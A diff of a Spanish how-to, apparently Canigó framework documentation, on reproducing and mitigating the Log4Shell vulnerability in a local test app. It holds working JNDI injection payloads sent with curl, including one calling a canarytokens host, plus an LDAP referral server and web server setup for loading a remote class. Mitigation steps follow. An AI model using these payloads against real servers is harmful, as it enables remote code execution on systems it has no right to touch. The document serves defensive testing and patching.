@@ -23,7 +23,7 @@ Esta vulnerabilidad permite ejecutar código en un servidor remoto, inyectando u
 
 ## Como explotar la vulnerabilidad en Canigó
 
-1. Crear una aplicación con el archetype de Canigó por ejemplo: `CanigoLog4jShellTest`
+ 1- Crear una aplicación con el archetype de Canigó por ejemplo: `CanigoLog4jShellTest`
 
   ```sh
   # Canigó 3.6
@@ -36,7 +36,7 @@ Esta vulnerabilidad permite ejecutar código en un servidor remoto, inyectando u
   -Dversion=1.0.0 -B
   ```
 
-2. Modificar el servicio de pruebas: `EquipamentServiceController` para imprimir en el log, los parámetros de entrada del servicio de creación de equipaments
+ 2- Modificar el servicio de pruebas: `EquipamentServiceController` para imprimir en el log, los parámetros de entrada del servicio de creación de equipaments
 
   ```java
   import org.apache.logging.log4j.LogManager;
@@ -50,7 +50,7 @@ Esta vulnerabilidad permite ejecutar código en un servidor remoto, inyectando u
   }
   ```
 
-3. Iniciar el proyecto creado con el servidor tomcat embebido, por ejemplo:
+ 3- Iniciar el proyecto creado con el servidor tomcat embebido, por ejemplo:
 
   ```sh
   mvn clean spring-boot:run
@@ -71,18 +71,20 @@ Esta vulnerabilidad permite ejecutar código en un servidor remoto, inyectando u
 
 ### Utilizando el proyecto `canarytokens`
 
+---
+
 > El proyecto de código abierto: `canarytokens` permite generar tokens para explotar vulnerabilidades. \
 > Sí al utilizar un token se explota una vulnerabilidad, se envía un correo electrónico con los detalles del acceso \
 > <https://docs.canarytokens.org/guide/> \
 > <https://github.com/thinkst/canarytokens> \
 
-4. Generar un token tipo `log4jshell` desde: <https://canarytokens.org/generate#>, por ejemplo:
+ 4- Generar un token tipo `log4jshell` desde: <https://canarytokens.org/generate#>, por ejemplo:
 
   ```txt
   ${jndi:ldap://127.0.0.1.xxxxxxxxxxxx.canarytokens.com/a}
   ```
 
-5. Generar una peticion HTTP Request para crear un `equipament` y en el nombre enviar el token malicioso creado con `canarytokens`
+ 5- Generar una peticion HTTP Request para crear un `equipament` y en el nombre enviar el token malicioso creado con `canarytokens`
 
   ```sh
   curl --request POST 'http://127.0.0.1:8080/api/equipaments' \
@@ -90,7 +92,7 @@ Esta vulnerabilidad permite ejecutar código en un servidor remoto, inyectando u
     --data-raw '{ "nom": "${jndi:ldap://127.0.0.1.xxxxxxxxxxxx.canarytokens.com/a}","municipi": "Barcelona"}'
   ```
 
-6. Verificar en el buzón del correo configurado en `canarytokens` y comprobar el correo con la traza de la conexión remota al servidor de la aplicación
+ 6- Verificar en el buzón del correo configurado en `canarytokens` y comprobar el correo con la traza de la conexión remota al servidor de la aplicación
 
   ![Email exploit test](/images/howtos/log4jshell/email_exploit_alert.png)
 
@@ -100,11 +102,19 @@ Esta vulnerabilidad permite ejecutar código en un servidor remoto, inyectando u
 
 ### Utilizando un servidor LDAP
 
+---
+
 > Se requiere: SO Linux, Python3, git, maven, acceso a internet
 
-4. Iniciar un servidor web que contenga el código malicioso a inyectar
+ 4- Iniciar un servidor web que contenga el código malicioso a inyectar
 
-  > Se puede utilizar el proyecto `https://github.com/cybereason/Logout4Shell.git` y modificar la clase `Log4jRCE.java` para agregar cualquier código malicioso que se quiera inyectar en un servidor
+  > Se puede utilizar el proyecto `https://github.com/cybereason/Logout4Shell.git` y modificar la clase `Log4jRCE.java` para agregar cualquier código malicioso que se quiera inyectar en un servidor. \
+  > Por ejemplo se puede agregar este código para inyectar en el servidor una traza
+
+  ```java
+    String dateNow = ZonedDateTime.now(ZoneId.of("Europe/Madrid")).format(DateTimeFormatter.ofPattern("yyyy-MM-dd'T'HH:mm:ss.SSSZ"));
+    System.out.println("Log4JShell - JPJE ----------------------------: " + dateNow);
+  ```
 
   ```sh
   git clone https://github.com/cybereason/Logout4Shell.git
@@ -113,15 +123,9 @@ Esta vulnerabilidad permite ejecutar código en un servidor remoto, inyectando u
   python3 -m http.server 8888
   ```
 
-5. Iniciar un servidor LDAP
+ 5- Iniciar un servidor LDAP
 
   > Se puede utilizar el proyecto `https://github.com/mbechler/marshalsec.git`
-  #### Por ejemplo se puede agregar este código para inyectar en el servidor vulnerable una traza
-
-  ```java
-    String dateNow = ZonedDateTime.now(ZoneId.of("Europe/Madrid")).format(DateTimeFormatter.ofPattern("yyyy-MM-dd'T'HH:mm:ss.SSSZ"));
-    System.out.println("Log4JShell - JPJE ----------------------------: " + dateNow);
-  ```   
 
   ```sh
   git clone https://github.com/mbechler/marshalsec.git
@@ -129,7 +133,7 @@ Esta vulnerabilidad permite ejecutar código en un servidor remoto, inyectando u
   java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Log4jRCE"
   ```
 
-6. Generar una peticion HTTP Request para crear un `equipament` y en el nombre enviar el token malicioso creado con `canarytokens`
+ 6- Generar una peticion HTTP Request para crear un `equipament` y en el nombre enviar el token malicioso creado con `canarytokens`
 
   ```sh
   curl --request POST 'http://127.0.0.1:8080/api/equipaments' \
@@ -137,7 +141,7 @@ Esta vulnerabilidad permite ejecutar código en un servidor remoto, inyectando u
     --data-raw '{ "nom": "${jndi:ldap://127.0.0.1:1389/a}","municipi": "Barcelona"}'
   ```
 
-7. Revisar en el log de la aplicación `CanigoLog4jShellTest` los efectos de explotar la vulnerabilidad
+ 7- Revisar en el log de la aplicación `CanigoLog4jShellTest` los efectos de explotar la vulnerabilidad
 
   > Con la vulnerabilidad
 
@@ -153,9 +157,9 @@ Esta vulnerabilidad permite ejecutar código en un servidor remoto, inyectando u
 
 ---
 
-1. Sustituir la version de la dependencia de la librería `log4j` (tiempo de compilación). Por ejemplo:
+ 1- Sustituir la version de la dependencia de la librería `log4j` (tiempo de compilación). Por ejemplo:
 
-   1.1 modificando el: `pom.xml` (Opción recomendada) (requiere recompilar y desplegar)
+  1-1 modificando el: `pom.xml` (Opción recomendada) (requiere recompilar y desplegar)
 
   ```xml
   <properties>
@@ -163,21 +167,21 @@ Esta vulnerabilidad permite ejecutar código en un servidor remoto, inyectando u
   </properties>
   ```
 
-  1.2 inyectando la variable durante la construcción de la aplicación (requiere recompilar y redesplegar)
+  1-2 inyectando la variable durante la construcción de la aplicación (requiere recompilar y redesplegar)
 
   ```sh
   mvn -Dlog4j2.version=2.15.0 clean package && java -jar ./target/CanigoLog4jShellTest.war
   ```
 
-2. Configurar la variable: `log4j2.formatMsgNoLookups (tiempo de ejecución)
+ 2- Configurar la variable: `log4j2.formatMsgNoLookups (tiempo de ejecución)
 
-  2.1 inyectando la variable (sirve para: 2.10 >= log4j >= 2.14.1) (requiere redesplegar)
+  2-1 inyectando la variable (sirve para: 2.10 >= log4j >= 2.14.1) (requiere redesplegar)
 
   ```sh
   mvn clean package && java -Dlog4j2.formatMsgNoLookups=true -jar ./target/CanigoLog4jShellTest.war
   ```
 
-  2.2 agregando una variable de entorno (sirve para: 2.10 >= log4j >= 2.14.1) (requiere redesplegar)
+  2-2 agregando una variable de entorno (sirve para: 2.10 >= log4j >= 2.14.1) (requiere redesplegar)
 
   > fuente: https://msrc-blog.microsoft.com/2021/12/11/microsofts-response-to-cve-2021-44228-apache-log4j2/
 
@@ -191,7 +195,7 @@ Esta vulnerabilidad permite ejecutar código en un servidor remoto, inyectando u
     canigo/app
   ```
 
-3. Modificar el patron de trazas configuradas en el archivo: `log4j.xml` (sirve para: 2.0-beta1 >= log4j >= 2.14.1) (requiere recompilar y redesplegar), por ejemplo:
+ 3- Modificar el patron de trazas configuradas en el archivo: `log4j.xml` (sirve para: 2.0-beta1 >= log4j >= 2.14.1) (requiere recompilar y redesplegar), por ejemplo:
 
   > fuente: https://kb.vmware.com/s/article/87093
 
@@ -203,7 +207,7 @@ Esta vulnerabilidad permite ejecutar código en un servidor remoto, inyectando u
   <PatternLayout pattern="canigo Message: %d{dd MM yyyy HH:mm:ss,SSS} %-5p [%t] %-5p [%t] %c - %m%n" />
   ```
 
-4. Eliminar la clase `maliciosa` (sirve para: 2.0-beta1 >= log4j >= 2.14.1) (requiere recompilar y redesplegar), por ejemplo:
+ 4- Eliminar la clase `maliciosa` (sirve para: 2.0-beta1 >= log4j >= 2.14.1) (requiere recompilar y redesplegar), por ejemplo:
 
   ```sh
   zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
